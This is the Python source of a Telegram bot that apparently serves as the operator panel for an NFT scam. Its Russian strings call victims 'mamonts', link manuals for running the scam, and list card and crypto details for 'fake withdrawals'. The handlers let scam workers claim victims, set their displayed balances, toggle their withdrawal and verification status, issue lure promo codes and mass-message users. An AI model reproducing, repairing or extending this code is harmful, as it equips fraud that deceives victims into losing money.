from loader import dp, bot
from aiogram.dispatcher import FSMContext
from aiogram import types

from keyboards import get_worker_menu, get_mamonts_menu, setting_mamont_menu
from utils.database import get_mamonts, get_workers, get_users, create_promo_db, get_promocodes, add_mamont_db, add_worker, get_user, set_mamont_balance_db, set_mamont_verif, set_mamont_vivod, del_mamont_db

from states import StorageCreatePromo, StorageAddMamonts, StorageBalanceMamont

@dp.message_handler(text=['⚡️ Меню воркера', 'РАБотник'])
async def worker(message: types.Message, state:FSMContext):
    add_worker(message.from_id)
    await state.finish()
    me = await bot.get_me()
    await message.answer(f'⚡️ Меню воркера:\n\nРеквизиты для фейк вывода средств с баланса:\n├ Банковская Карта: 5469440017276685\n├ Номер QIWI: 79264409426\n├ ЮMoney: 411037454376341\n├ WebMoney: R207033756796\n├ Ethereum: 0x4675c7e5baafbffbca748158becba61ef3b0a263\n├ USDT TRC20: TQQraDH83vbw9Zu9HsLjNtdcRkvpiGtM7M\n└ Bitcoin: 1DFo9TYjyKT7Rwa1Nx7G3STMRHBFUC2hUB\n\nРеферальная ссылка:\nhttps://t.me/{me["username"]}?start={message.from_id}\nМануал для работы:\n<a href="https://telegra.ph/Kak-polzovatsya-botom-NFT-OpenSea-06-18">Первый мануал</a>\n<a href="https://telegra.ph/Manual-po-vorku-NFT-skama-06-18">Второй мануал</a>', reply_markup=get_worker_menu())

@dp.callback_query_handler(text='my_mamonts')
async def my_mamonts(call: types.CallbackQuery):
    mamonts = get_mamonts(call.from_user.id)
    if len(mamonts) == 0:
        await call.answer('❌У вас нет мамонтов')
    else:
        await bot.send_message(call.from_user.id, 'Ваши мамонты:', reply_markup=get_mamonts_menu(mamonts))

@dp.message_handler(commands=['sendforworkers'])
async def worker(message: types.Message):
    successfulsent=0
    text = message.text[16:]
    workers = get_workers()
    for worker in workers:
        try:
            await bot.send_message(worker['tg_id'], f'{text}')
            successfulsent=successfulsent+1
        except:
            pass
    await bot.send_message(message.from_user.id, f'Рассылка завершена, успешно отправлено: {successfulsent}')

@dp.message_handler(commands=['sendforall'])
async def user(message: types.Message):
    successfulsent=0
    users = get_users()
    text = message.text[12:]
    for user in users:
        try:
            await bot.send_message(user['tg_id'], f'{text}')
            successfulsent=successfulsent+1
        except:
            pass
    await bot.send_message(message.from_user.id, f'Рассылка завершена, успешно отправлено: {successfulsent}')

@dp.callback_query_handler(text_startswith='setting:')
async def mamont_setting(call: types.CallbackQuery):
    mamont_id = call.data.split(':')[1]
    user = get_user(mamont_id, '')
    await bot.send_message(call.from_user.id, f'🐘 Мамонт: @{user["username"]}\n🆔: {user["tg_id"]}\n🏦 Баланс: {user["balance"]}₽\n💰 Может ли выводить: {"✅" if user["can_withdraw"] else "❌"}\n👨‍💻 Верификация: {"✅" if user["is_verif"] else "❌"}', reply_markup=setting_mamont_menu(mamont_id))

@dp.callback_query_handler(text_startswith='set:')
async def set_mamont_setting(call:types.CallbackQuery, state:FSMContext):
    _, setting, mamont_id = call.data.split(':')
    async with state.proxy() as data:
            data['mamont_id'] = mamont_id
    if setting == 'balance':
        await StorageBalanceMamont.value.set()
        await bot.send_message(call.from_user.id, 'Введите сумму:')
    elif setting == 'vivod':
        user = get_user(mamont_id, '')
        if user['can_withdraw']:
            set_mamont_vivod(mamont_id, 0)
        else:
            set_mamont_vivod(mamont_id, 1)
    elif setting == 'delete':
        del_mamont_db(mamont_id)
        await bot.edit_message_text(chat_id=call.from_user.id, message_id=call.message.message_id, text=f'Удалил')
        return
    elif setting == 'verif':
        user = get_user(mamont_id, '')
        if user['is_verif']:
            set_mamont_verif(mamont_id, 0)
        else:
            set_mamont_verif(mamont_id, 1)
        user = get_user(mamont_id, '')
    else:
        pass
    user = get_user(mamont_id, '')
    await call.message.answer(f'🐘 Мамонт: @{user["username"]}\n🆔: {user["tg_id"]}\n🏦 Баланс: {user["balance"]}₽\n💰 Может ли выводить: {"✅" if user["can_withdraw"] else "❌"}\n👨‍💻 Верификация: {"✅" if user["is_verif"] else "❌"}', reply_markup=setting_mamont_menu(data['mamont_id']))

@dp.message_handler(state=StorageBalanceMamont.value)
async def set_mamont_balance(message: types.Message, state:FSMContext):
    if message.text.isdigit():
        async with state.proxy() as data:
            set_mamont_balance_db(data['mamont_id'], message.text)
            user = get_user(data['mamont_id'], '')
        await message.answer(f'🐘 Мамонт: @{user["username"]}\n🆔: {user["tg_id"]}\n🏦 Баланс: {user["balance"]}₽\n💰 Может ли выводить: {"✅" if user["can_withdraw"] else "❌"}\n👨‍💻 Верификация: {"✅" if user["is_verif"] else "❌"}', reply_markup=setting_mamont_menu(data['mamont_id']))
    else:
        await message.answer('Неверная сумма')
    await state.finish()

@dp.callback_query_handler(text='add_mamonts')
async def add_mamonts(call:types.CallbackQuery):
    await bot.send_message(call.from_user.id, 'Введите user_id мамонта:')
    await StorageAddMamonts.mamont.set()

@dp.message_handler(state=StorageAddMamonts.mamont)
async def add_mamont_id(message:types.Message, state:FSMContext):
    await state.finish()
    if message.text.isdigit():
        if add_mamont_db(message.from_id, message.text):
            await message.answer('Мамонт успешно добавлен')
        else:
            await message.answer('Мамонт уже является чьим-то')
    else:
        await message.answer('Неверный user_id')

@dp.callback_query_handler(text='create_promo')
async def create_promo(call: types.CallbackQuery):
    await bot.send_message(call.from_user.id, 'Введите сумму промокода:')
    await StorageCreatePromo.price.set()

@dp.message_handler(state=StorageCreatePromo.price)
async def create_promo_price(message: types.Message, state:FSMContext):
    await state.finish()
    if message.text.isdigit():
        await message.answer(f'✅ Промокод успешно создан:\n├ Промо: {create_promo_db(message.from_id, message.text)}\n└ Сумма: {message.text}₽')
    else:
        await message.answer('Неверное число')

@dp.callback_query_handler(text='my_promo')
async def my_promo(call: types.CallbackQuery):
    promocodes = get_promocodes(call.from_user.id)
    if len(promocodes) == 0:
        await call.answer('У вас нет промокодов')
    else:
        text = 'Список промокодов:\n\n'
        for promo in promocodes:
            if promo['is_used'] == 0:
                text += f'{promo["cod"]} - {promo["value"]}\n'
        await bot.send_message(call.from_user.id, text)
